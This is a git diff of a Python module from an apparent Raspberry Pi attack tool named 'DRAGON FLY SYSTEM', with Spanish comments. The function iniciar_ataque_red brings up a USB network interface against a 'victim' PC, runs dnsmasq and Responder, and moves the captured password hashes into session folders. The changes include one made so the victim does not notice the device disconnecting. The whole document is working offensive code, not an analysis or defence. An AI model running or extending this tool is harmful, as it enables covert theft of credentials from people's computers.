@@ -3,7 +3,7 @@ import subprocess
 import time
 import re
 
-def iniciar_ataque_red(interface="eth1", callback_consola=None):
+def iniciar_ataque_red(interface="usb0", callback_consola=None, session_dir=None): # <-- Se añade session_dir
     
     def log(texto):
         texto_limpio = re.sub(r'\x1b\[[0-9;]*m', '', texto)
@@ -12,12 +12,10 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
             texto_limpio = texto_limpio.replace(simbolo, '')
             
         if callback_consola:
-            callback_consola(f"{texto_limpio}\n")
+            # self.escribir_consola de raspi.py agrega los saltos de línea automáticamente
+            callback_consola(f"{texto_limpio}") 
         else:
             print(texto_limpio)
-        
-        with open("error_reporte.txt", "a", encoding="utf-8") as archivo_error:
-            archivo_error.write(f"{texto_limpio}\n")
 
     log(f"\n[!] DRAGON FLY SYSTEM")
     log(f"[*] Configurando interfaz: {interface}")
@@ -31,13 +29,12 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
     proc_responder = None
     
     try:
-        log("[*] Desvinculando interfaz de NetworkManager (Previniendo caídas)...")
+        log("[*] Desvinculando interfaz de NetworkManager...")
         os.system(f"sudo nmcli device set {interface} managed no > /dev/null 2>&1")
         
         log("[*] Levantando interfaz de red...")
         os.system(f"sudo ip link set {interface} up")
         
-        # FIX INTERFACE NOT FOUND: Damos tiempo al PC víctima para negociar el USB
         time.sleep(3)
         
         os.system(f"sudo sysctl -w net.ipv6.conf.{interface}.disable_ipv6=1 > /dev/null 2>&1")
@@ -114,27 +111,21 @@ def iniciar_ataque_red(interface="eth1", callback_consola=None):
         os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
         os.system(f"sudo ip addr flush dev {interface} > /dev/null 2>&1")
         
-        # FIX INTERFACE: Se eliminó el comando "ip link set down" para que el PC víctima 
-        # no crea que desconectaste la Raspberry Pi físicamente.
-        
         if os.path.exists("dnsmasq_temp.conf"):
             try: os.remove("dnsmasq_temp.conf")
             except: pass
             
         # ==========================================
-        # FIX LOGS: EXTRACCIÓN Y GUARDADO
+        # GUARDADO DE LOGS EN SESIÓN ESPECÍFICA
         # ==========================================
-        log("[*] Recopilando evidencia y copiando logs...")
-        ruta_actual = os.path.dirname(os.path.abspath(__file__)) # network_modules
-        ruta_padre = os.path.dirname(ruta_actual) # DragonFly
-        ruta_logs = os.path.join(ruta_padre, "logs")
-        os.makedirs(ruta_logs, exist_ok=True)
-        
-        # Copiar logs conservando fechas (-p) desde las rutas posibles
-        os.system(f"sudo cp -rp /usr/share/responder/logs/* {ruta_logs}/ 2>/dev/null")
-        os.system(f"sudo cp -rp /opt/Responder/logs/* {ruta_logs}/ 2>/dev/null")
-        
-        # Dar permisos completos para que Python pueda leerlos y borrarlos si quieres
-        os.system(f"sudo chmod -R 777 {ruta_logs} 2>/dev/null")
-        
+        if session_dir:
+            log(f"[*] Organizando evidencia en: {os.path.basename(session_dir)}")
+            os.makedirs(session_dir, exist_ok=True)
+            
+            # Usamos MV (mover) para evitar que sesiones futuras muestren hashes de ataques viejos
+            os.system(f"sudo mv /usr/share/responder/logs/* {session_dir}/ 2>/dev/null")
+            os.system(f"sudo mv /opt/Responder/logs/* {session_dir}/ 2>/dev/null")
+            
+            os.system(f"sudo chmod -R 777 {session_dir} 2>/dev/null")
+            
         log("[+] Sistema restaurado. ¡Cacería finalizada!")
